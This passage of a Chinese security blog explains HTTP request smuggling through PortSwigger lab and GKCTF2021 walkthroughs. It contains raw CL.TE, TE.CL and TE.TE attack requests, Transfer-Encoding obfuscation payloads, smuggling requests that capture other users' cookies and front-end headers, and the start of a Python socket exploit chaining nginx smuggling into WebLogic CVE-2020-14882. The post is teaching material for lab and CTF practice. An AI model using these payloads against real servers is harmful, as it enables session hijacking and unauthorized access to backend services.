class="hljs-string">\r\n</span><br>Sec-Ch-Ua: <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span><span class="hljs-string">\r\n</span><br>Sec-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br>Sec-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><span class="hljs-string">\r\n</span><br>Upgrade-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-string">\r\n</span><br>User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537.36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100.0</span>.<span class="hljs-number">4896.127</span> Safari/<span class="hljs-number">537.36</span><span class="hljs-string">\r\n</span><br>Accept: text<span class="hljs-regexp">/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/</span>*;q=<span class="hljs-number">0.8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0.9</span><span class="hljs-string">\r\n</span><br>Sec-Fetch-Site: none<span class="hljs-string">\r\n</span><br>Sec-Fetch-Mode: navigate<span class="hljs-string">\r\n</span><br>Sec-Fetch-User: ?<span class="hljs-number">1</span><span class="hljs-string">\r\n</span><br>Sec-Fetch-Dest: document<span class="hljs-string">\r\n</span><br>Accept-Encoding: gzip, deflate<span class="hljs-string">\r\n</span><br>Accept-Language: zh-CN,zh;q=<span class="hljs-number">0.9</span><span class="hljs-string">\r\n</span><br>Connection: close<span class="hljs-string">\r\n</span><br>Content-Length: <span class="hljs-number">10</span><span class="hljs-string">\r\n</span><br>Transfer-Encoding:chunked<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br>A<span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>连续发送几次就会发现字母A被拼接到了下一请求中，导致了请求走私，当然也会报错。</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503231744853.png" class="" title="image-20220503231744853"><h4 id="4-TE-CL"><a href="#4-TE-CL" class="headerlink" title="4.TE CL"></a>4.TE CL</h4><p>TE CL与CL TE正好相反，假如前端服务器处理TE请求头，而后端服务器处理CL请求头，我们同样可以构造恶意数据包完成走私攻击；依旧使用portswigger的lab：<a href="https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl">https://portswigger.net/web-security/request-smuggling/lab-basic-te-cl</a></p><p>我们构造出如下请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac901ff41f9aa7fdc0ce7b16001000db.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=MrJkkUD4dyxv9gzzgERPtb56d0cCo79Z<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Sec-Ch-Ua</span><span class="hljs-punctuation">: </span>&quot; Not A;Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;100&quot;, &quot;Google Chrome&quot;;v=&quot;100&quot;<br><span class="hljs-attribute">Sec-Ch-Ua-Mobile</span><span class="hljs-punctuation">: </span>?0<br><span class="hljs-attribute">Sec-Ch-Ua-Platform</span><span class="hljs-punctuation">: </span>&quot;Windows&quot;<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Sec-Fetch-Site</span><span class="hljs-punctuation">: </span>cross-site<br><span class="hljs-attribute">Sec-Fetch-Mode</span><span class="hljs-punctuation">: </span>navigate<br><span class="hljs-attribute">Sec-Fetch-User</span><span class="hljs-punctuation">: </span>?1<br><span class="hljs-attribute">Sec-Fetch-Dest</span><span class="hljs-punctuation">: </span>document<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>https://portswigger.net/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>4<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-apache"><span class="hljs-attribute">12</span></span><br><span class="language-apache"><span class="hljs-attribute">WPOST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"></span><br><span class="language-apache"><span class="hljs-attribute">0</span></span><br><span class="language-apache"></span><br></code></pre></td></tr></table></figure><p>多次发送后发现：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220503233723881.png" class="" title="image-20220503233723881"><p>WPOST被拆分了出来，重点关注body部分</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-string">\r\n</span><br><span class="hljs-number">12</span><span class="hljs-string">\r\n</span><br>WPOST / HTTP/<span class="hljs-number">1.1</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br><span class="hljs-number">0</span><span class="hljs-string">\r\n</span><br><span class="hljs-string">\r\n</span><br></code></pre></td></tr></table></figure><p>前端处理TE读取到<code>0\r\n\r\n</code>之后就认为读取完毕发送给后端，而后端处理CL只读取4字节<code>\r\n12</code>就认为数据包结束，这时候剩下的<code>WPOST / HTTP/1.1\r\n\r\n0\r\n\r\n</code>就被认为是另一个请求，因此发生了请求报错。</p><h4 id="5-TE-TE"><a href="#5-TE-TE" class="headerlink" title="5.TE TE"></a>5.TE TE</h4><p>TE-TE：前置和后端服务器都支持 <code>Transfer-Encoding</code>，但通过混淆能让它们在处理时产生分歧。</p><p>lab:<a href="https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header">https://portswigger.net/web-security/request-smuggling/lab-obfuscating-te-header</a></p><p>构造出如下请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ace41f161f1a1382c0814ee300db0086.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=nqskpdP0aWuG4GW5xlYYxEUVulcJC6vG<br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua: <span class="hljs-string">&quot; Not A;Brand&quot;</span>;v=<span class="hljs-string">&quot;99&quot;</span>, <span class="hljs-string">&quot;Chromium&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span>, <span class="hljs-string">&quot;Google Chrome&quot;</span>;v=<span class="hljs-string">&quot;100&quot;</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Mobile: ?<span class="hljs-number">0</span><br><span class="hljs-attribute">Sec</span>-Ch-Ua-Platform: <span class="hljs-string">&quot;Windows&quot;</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b3;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Sec</span>-Fetch-Site: cross-site<br><span class="hljs-attribute">Sec</span>-Fetch-Mode: navigate<br><span class="hljs-attribute">Sec</span>-Fetch-User: ?<span class="hljs-number">1</span><br><span class="hljs-attribute">Sec</span>-Fetch-Dest: document<br><span class="hljs-attribute">Referer</span>: https://portswigger.net/<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Connection</span>: close<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">4</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked  //两种TE造成混淆<br><span class="hljs-attribute">Transfer</span>-Encoding:cow<br><br><span class="hljs-attribute">5c</span><br><span class="hljs-attribute">WPOST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">15</span><br><br><span class="hljs-attribute">x</span>=<span class="hljs-number">1</span><br><span class="hljs-attribute">0</span><br><br><br></code></pre></td></tr></table></figure><p>多次发送后：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504000904015.png" class="" title="image-20220504000904015"><p>可以看到这里我们采用了：</p><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs fortran"><span class="hljs-built_in">Transfer</span>-Encoding:chunked\r\n<br><span class="hljs-built_in">Transfer</span>-Encoding:cow\r\n<br></code></pre></td></tr></table></figure><p>除了这种混淆方式，除了这些portswigger团队还给出了其它可用于TE混淆的payload：</p><blockquote><dl><dt>Transfer-Encoding: xchunked<br>Transfer-Encoding[空格]: chunked<br>Transfer-Encoding: chunked<br>Transfer-Encoding: x<br>Transfer-Encoding:[tab]chunked<br>[空格]Transfer-Encoding: chunked<br>X: X[\n]Transfer-Encoding: chunked<br>Transfer-Encoding</dt><dd>chunked</dd></dl></blockquote><h2 id="0x04-走私攻击应用实例"><a href="#0x04-走私攻击应用实例" class="headerlink" title="0x04 走私攻击应用实例"></a>0x04 走私攻击应用实例</h2><h3 id="1-使用CL-TE走私获取其他用户的请求"><a href="#1-使用CL-TE走私获取其他用户的请求" class="headerlink" title="1.使用CL TE走私获取其他用户的请求"></a>1.使用CL TE走私获取其他用户的请求</h3><p>lab：<a href="https://ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net/">https://ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net/</a></p><p>打开页面是blog，用户可以在页面发表评论，由于前后端服务器的请求头处理差异导致我们可以利用CL TE获取其它用户的请求头，譬如我们构造出如下请求：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">333</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><br><span class="hljs-attribute">0</span><br><br><span class="hljs-attribute">POST</span> /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span>: session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">700</span><br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><br><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F1.com&amp;comment=spring<br></code></pre></td></tr></table></figure><p>前端服务器使用CL验证，获取CL为333后判定这是一个正常的请求并发送给后端，而后端服务器通过TE的结尾表标识<code>0\r\n\r\n</code>认为前半部分是一个正常的请求，而后半部分：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>700<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F1.com&amp;comment=spring</span><br></code></pre></td></tr></table></figure><p>因为Pipeline的存在被放置在了缓存区。如果这时另一个正常用户也发来了一段评论，那么这个请求会被拼接到滞留在缓存区的请求后面构成一个新的请求：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/post/comment</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>session=plmft6w5VTTDEI0J15a06sNdaQUcPNPO<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>700<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><br><span class="language-apache"><span class="hljs-attribute">csrf</span>=vMqN9Cq1aip2DYMTyFEokIA5IkONc7oM&amp;postId=<span class="hljs-number">6</span>&amp;name=a&amp;email=<span class="hljs-number">1</span>%<span class="hljs-number">40</span>qq.com&amp;website=http%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F1.com&amp;comment=springPOST /post/comment HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span></span><br><span class="language-apache"><span class="hljs-attribute">Host</span>: ac991f4d1ef4a5e7c0bd1cc8006c0014.web-security-academy.net</span><br><span class="language-apache"><span class="hljs-attribute">Cookie</span>: session=ashAwdweas.......</span><br></code></pre></td></tr></table></figure><p>这时候我们就发现<strong>请求头被拼接到了comment的后面然后被当作comment返回</strong>，这样我们就可能通过获取到其他用户的Cookie。</p><p>在lab中我们要不断第二个CL的大小，调整至合适大小才有可能正常泄露出来；我从700开始服务器报500，但不知道是哪里出了问题响应一直超时：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504223219276.png" class="" title="image-20220504223219276"><p>不过原理还是很好理解，大家可以自己去试一试，有点玄学。</p><h3 id="2-泄露请求头重写请求实现未授权访问"><a href="#2-泄露请求头重写请求实现未授权访问" class="headerlink" title="2.泄露请求头重写请求实现未授权访问"></a>2.泄露请求头重写请求实现未授权访问</h3><p>前面我们提到，前端服务器的作用之一就是过滤外界用户对于未授权接口的访问，一般前端用户收到一段请求后，会在包里添加一些请求头例如：</p><ul><li>用户的<code>session</code>等会话ID。</li><li>XFF头用于显示用户IP，当然一般不会是<code>X-Forwarded-For</code>因为很容易被猜到。</li><li>用户指纹信息、<code>token</code>等。</li></ul><p><strong>如果我们能泄露这些前端服务器向后端服务器中继发送的请求中的请求头，那么我们就可以伪造出前端服务器的请求包来完成对敏感接口的未授权访问，实现一些恶意操作。</strong></p><p>那么问题来了，我们如何能获取到前端服务器发送到后端服务器的请求头呢？其实不难想，如果服务器能对我们输入的POST参数，即body部分响应输出，然后我们构造一个普通的请求放在body后面，前端服务器接收到之后就会对我们添加的请求进行重写，如果我们的指定<code>Content-Length</code>为较大的值就会把前端服务器重写时添加的重要字段给泄露出来拼接到body后面，随后后端服务器会将其与响应一并返回。</p><p>这么讲可能还是有些抽象，我们拿lab来举例：</p><p><a href="https://acbc1f4d1e121980c02b64d600c40022.web-security-academy.net/">https://acbc1f4d1e121980c02b64d600c40022.web-security-academy.net/</a></p><p>构造出如下请求包：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: acbc1f4d1e121980c02b64d600c40022.web-security-academy.net<br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win64; x64) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">100</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4896</span>.<span class="hljs-number">127</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span><br><span class="hljs-attribute">Cookie</span>: session=RcsAYo8SoCQx0bwXn0oG0G1RkLNPHuz4<br><span class="hljs-attribute">Content</span>-Type: application/x-www-form-urlencoded<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">77</span><br><span class="hljs-attribute">Transfer</span>-Encoding:chunked<br><br><span class="hljs-attribute">0</span><br><br><br><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span><br><br></code></pre></td></tr></table></figure><p>多发送几次我们会发现成功泄露出来XFF头信息：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220504233348109.png" class="" title="image-20220504233348109"><p>我们简单捋一下过程便于理解，首先前端服务器通过CL判断出这是一个完整的请求并转发给后端服务器，后端服务器通过TE将<code>0</code>字节标识前的部分正常处理，后半部分也被看作是一次正常的请求但被滞留在缓存区，同时由于我们设置的CL是超过实际长度，缓存区就会等待下一次正常请求，也就是前端服务器发来的新请求截取其部分请求头放在请求参数后面凑够CL后一并返回。</p><p>我们走私到后端服务器被滞留在缓存区的请求是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span><br><br></code></pre></td></tr></table></figure><p>后端服务器接收到新请求并拼接在search之后是：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Content</span>-Length:<span class="hljs-number">70</span><br><span class="hljs-attribute">Connection</span>:close<br><br><span class="hljs-attribute">search</span>=<span class="hljs-number">111</span> POST / HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span> X-TsINOz-Ip: <span class="hljs-number">117.136.5.78</span> Host:......<br></code></pre></td></tr></table></figure><p>最后后端服务器就会将信息响应返回。</p><h3 id="3-其它应用"><a href="#3-其它应用" class="headerlink" title="3.其它应用"></a>3.其它应用</h3><p>除了这两种还有一些利用方式：</p><ul><li>反射型 XSS 组合拳</li><li>将 on-site 重定向变为开放式重定向</li><li>缓存投毒</li><li>缓存欺骗</li></ul><p>这些**@mengchen**师傅在知道创宇404发的paper里都有实验讲解，感兴趣的可以去看一看。(paper链接在文末)</p><h2 id="0x05-CTF实战利用"><a href="#0x05-CTF实战利用" class="headerlink" title="0x05 CTF实战利用"></a>0x05 CTF实战利用</h2><h3 id="GKCTF2021-hackme"><a href="#GKCTF2021-hackme" class="headerlink" title="GKCTF2021[hackme]"></a>GKCTF2021[hackme]</h3><p>这道题目首先是需要nosql注入爆出密码，然后登陆获得任意文件读取功能，前半部分我们暂且忽略，我们重点关注后半部分。</p><p>读取nginx配置文件发现后端存在weblogic服务：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505100631052.png" class="" title="image-20220505100631052"><p>同时注意到nginx版本为1.17.6，存在请求走私：</p><img src="/2022/10/21/HTTP-request-smuggling%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/image-20220505100658589.png" class="" title="image-20220505100658589"><p>假如我们构造：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /a HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: localhost<br><span class="hljs-attribute">Content</span>-Length: <span class="hljs-number">56</span><br><span class="hljs-attribute">GET</span> /_hidden/index.html HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: notlocalhost<br></code></pre></td></tr></table></figure><p>那么nginx会把这两个请求都执行，这就会造成请求走私。可参考：<a href="https://v0w.top/2020/12/20/HTTPsmuggling/#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81">https://v0w.top/2020/12/20/HTTPsmuggling/#5-2-%EF%BC%88CVE-2020-12440%EF%BC%89Nginx-lt-1-8-0-%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81</a></p><p>针对这道题目我们构造出如下请求包：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/test</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>node4.buuoj.cn:27230<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>0<br><span class="hljs-attribute">Transfer-Encoding</span><span class="hljs-punctuation">: </span>chunked<br><br><span class="language-http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/console/login/LoginForm.jsp</span> <span class="hljs-meta">HTTP/1.1</span></span><br><span class="language-http"><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>weblogic</span><br><span class="language-http"></span><br></code></pre></td></tr></table></figure><p>响应包中包含了weblogic的版本信息：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">WebLogic</span> Server Version: <span class="hljs-number">12.2.1.4</span>.<span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><p>版本正好契合CVE-2020-14882，我们直接拿socket去打就可以拿到flag。</p><h4 id="最终exp"><a href="#最终exp" class="headerlink" title="最终exp"></a>最终exp</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python">//来源于https://www.lemonprefect.cn的博客<br><span class="hljs-keyword">import</span> socket<br><br>sSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br>sSocket.connect((<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>, <span class="hljs-number">26319</span>))<br>payload = <span class="hljs-string">b&#x27;&#x27;&#x27;HEAD / HTTP/1.1\r\nHost: node4.buuoj.cn\r\n\r\nGET 